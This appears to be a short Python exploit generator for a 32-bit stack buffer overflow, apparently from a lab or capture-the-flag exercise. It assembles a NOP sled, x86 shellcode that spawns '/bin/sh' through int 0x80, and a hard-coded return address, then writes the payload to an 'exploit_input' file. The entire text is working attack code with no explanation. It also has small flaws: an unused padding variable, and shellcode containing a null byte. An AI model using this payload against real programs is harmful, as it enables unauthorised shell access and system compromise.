import struct


padding = b"\x90" * 8  #Reach the begin of the buffer
eip = struct.pack("<I", 0xffffcd70)  # Pack address in little-endian format
nop_sled = b"\x90" * 35 # Use bytes
shellcode = b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" 

# Combine all parts into the payload
payload = nop_sled + shellcode + eip 

# Output payload to a file
with open("exploit_input", "wb") as f:
    f.write(payload)
